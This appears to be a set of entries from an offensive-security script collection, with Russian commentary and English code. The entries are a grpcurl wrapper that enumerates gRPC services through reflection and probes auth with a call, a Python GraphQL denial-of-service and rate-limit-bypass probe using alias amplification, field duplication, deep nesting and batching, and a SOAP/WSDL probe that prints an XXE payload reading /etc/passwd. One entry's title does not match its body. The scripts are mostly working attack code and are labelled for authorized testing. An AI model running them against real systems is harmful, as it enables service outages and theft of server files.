entries.title: OpenAPI / Swagger mass tester (path x method)
gRPC reflection enumeration (grpcurl wrapper)
entries.body:
Энумерация **gRPC-сервиса через server reflection** утилитой `grpcurl`: список сервисов, описание методов и сообщений, пробный вызов. Если рефлексия включена, получаешь полную карту API без `.proto`-файлов.

> `-plaintext` = подключение **без TLS** (не «HTTP/1.1»), для cleartext-gRPC. `-insecure` = TLS, но без проверки сертификата. Подбирай флаг под цель. grpcurl - bundled-friendly (MIT).

deps: `grpcurl` (apt/brew install grpcurl). placeholders: `{{TARGET}}` (host:port, напр. 10.0.0.5:50051).

```bash
#!/usr/bin/env bash
# grpc_reflect_enum.sh - ARS3NAL (GPL-3.0). Wraps grpcurl (MIT). AUTHORIZED testing only.
set -u
T="${1:?usage: grpc_reflect_enum.sh <host:port> [-plaintext|-insecure]}"
MODE="${2:--plaintext}"   # -plaintext (no TLS) | -insecure (TLS, skip cert)

echo "[*] target=$T mode=$MODE"
command -v grpcurl >/dev/null || { echo "[!] install grpcurl first"; exit 1; }

echo "=== services ==="
SVCS=$(grpcurl $MODE "$T" list 2>&1)
echo "$SVCS"
echo "$SVCS" | grep -qiE 'reflection|cannot|unimplemented' && \
  echo "[i] если reflection выключен -> нужен .proto: grpcurl -proto x.proto ..."

echo
echo "=== methods + messages per service ==="
echo "$SVCS" | grep -vi reflection | while read -r svc; do
  [ -z "$svc" ] && continue
  echo "--- $svc ---"
  grpcurl $MODE "$T" describe "$svc" 2>/dev/null
done

echo
echo "=== sample empty call (auth / shape probe) ==="
FIRST=$(echo "$SVCS" | grep -vi reflection | head -1)
if [ -n "$FIRST" ]; then
  M=$(grpcurl $MODE "$T" list "$FIRST" 2>/dev/null | head -1)
  [ -n "$M" ] && grpcurl $MODE -d '{}' "$T" "$M" 2>&1 | head -10
fi

echo "[=] reflection on = карта API; ошибки auth на вызове = точка обхода"
```

Запуск:
```bash
bash grpc_reflect_enum.sh 10.0.0.5:50051 -plaintext
bash grpc_reflect_enum.sh api.target.com:443 -insecure
```

entries.title: GraphQL DoS / rate-limit-bypass probe (5 vectors)
entries.body:
Проба **GraphQL DoS и обхода rate-limit** четырьмя векторами: introspection-дамп схемы, **alias-amplification** (N копий тяжёлого поля в одном запросе), **deep nesting** (циклический обход связей), **JSON-batching** (массив запросов в одном HTTP - обходит per-request RL) и **field-duplication** (повтор одного поля сотни раз - **CVE-2024-39895 в Directus** клал сервер именно так).

> destructive: amplification и nesting реально нагружают сервер. Начинай с малых `--mult`/`--depth`, следи за временем ответа. Introspection часто открыт даже когда «отключён» в проде.

deps: `pip install requests`. placeholders: `{{URL}}` (graphql endpoint), `{{FIELD}}` (тяжёлое поле из схемы).

```python
#!/usr/bin/env python3
# graphql_dos_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, time, requests

INTROSPECT = "{__schema{queryType{name} types{name fields{name}}}}"

def post(url, query, hdr, timeout, batch=None):
    body = batch if batch is not None else {"query": query}
    t0 = time.time()
    r = requests.post(url, json=body, headers=hdr, timeout=timeout, verify=False)
    return r, time.time() - t0

def alias_amplification(field, mult):
    parts = " ".join(f"a{i}: {field}" for i in range(mult))
    return "{" + parts + "}"

def field_duplication(field, mult):
    # CVE-2024-39895 class: один и тот же лист повторён N раз
    parts = " ".join([field] * mult)
    return "{" + parts + "}"

def deep_nesting(field, depth):
    inner = field
    for _ in range(depth):
        inner = f"{field}{{ {inner} }}"
    return "{" + inner + "}"

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL GraphQL DoS / RL-bypass probe")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-f", "--field", default="__typename", help="heavy field from schema")
    ap.add_argument("--mult", type=int, default=50, help="alias/dup count")
    ap.add_argument("--depth", type=int, default=6)
    ap.add_argument("--batch", type=int, default=20, help="JSON-batch size")
    ap.add_argument("--header", action="append", default=[], help="Extra header k:v")
    ap.add_argument("--timeout", type=int, default=30)
    a = ap.parse_args()
    requests.packages.urllib3.disable_warnings()
    hdr = {"Content-Type": "application/json"}
    for h in a.header:
        k, _, v = h.partition(":"); hdr[k.strip()] = v.strip()

    print("=== [1] introspection ===")
    r, dt = post(a.url, INTROSPECT, hdr, a.timeout)
    on = "__schema" in r.text
    print(f"  status={r.status_code} time={dt:.2f}s introspection={'ON' if on else 'off'}")

    print("=== [2] alias amplification ===")
    r, dt = post(a.url, alias_amplification(a.field, a.mult), hdr, a.timeout)
    print(f"  x{a.mult} status={r.status_code} time={dt:.2f}s")

    print("=== [3] field duplication (CVE-2024-39895 class) ===")
    r, dt = post(a.url, field_duplication(a.field, a.mult), hdr, a.timeout)
    print(f"  x{a.mult} status={r.status_code} time={dt:.2f}s")

    print("=== [4] deep nesting ===")
    r, dt = post(a.url, deep_nesting(a.field, a.depth), hdr, a.timeout)
    print(f"  depth={a.depth} status={r.status_code} time={dt:.2f}s")

    print("=== [5] JSON batching (per-request RL bypass) ===")
    batch = [{"query": "{__typename}"} for _ in range(a.batch)]
    r, dt = post(a.url, None, hdr, a.timeout, batch=batch)
    accepted = r.text.count("__typename") if r.ok else 0
    print(f"  batch={a.batch} status={r.status_code} time={dt:.2f}s accepted~{accepted}")
    print("\n[=] рост времени с ростом mult/depth = нет cost-limit; batch>1 ok = RL обходится")

if __name__ == "__main__":
    main()
```

Запуск:
```bash
python3 graphql_dos_probe.py -u https://target/graphql -f users --mult 50 --depth 6 --batch 20
```

entries.title: SOAP / WSDL probe (operations + XXE skeleton)
entries.body:
Проба **SOAP/WSDL**: тянет `?wsdl`, перечисляет операции и печатает скелет SOAP-конверта - готовую точку для инъекций (XXE через XML, command в параметрах). Старые SOAP-сервисы часто без auth и парсят внешние entity.

deps: `curl`, опц. `xmllint`. placeholders: `{{URL}}` (endpoint сервиса).

```bash
#!/usr/bin/env bash
# soap_wsdl_probe.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
set -u
U="${1:?usage: soap_wsdl_probe.sh <service-url>}"
C="curl -s -k --max-time 12"

echo "[*] fetching WSDL"
WSDL=$($C "$U?wsdl"); [ -z "$WSDL" ] && WSDL=$($C "$U?WSDL")
[ -z "$WSDL" ] && { echo "[!] no WSDL at $U?wsdl"; exit 1; }
echo "$WSDL" | head -c 200; echo " ..."

echo
echo "=== operations ==="
echo "$WSDL" | grep -oE '<(wsdl:)?operation name="[^"]+"' | \
  sed -E 's/.*name="([^"]+)".*/  \1/' | sort -u

echo
echo "=== target namespace ==="
echo "$WSDL" | grep -oE 'targetNamespace="[^"]+"' | head -1

echo
echo "=== SOAP envelope skeleton (XXE injection point) ==="
cat <<'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <OPERATION_NAME>
        <param>&xxe;</param>
      </OPERATION_NAME>
    </soap:Body>
  </soap:Envelope>
EOF
echo "[=] подставь операцию и POST на endpoint с Content-Type: text/xml"
```

Запуск:
```bash
bash soap_wsdl_probe.sh https://target/services/Calc
```
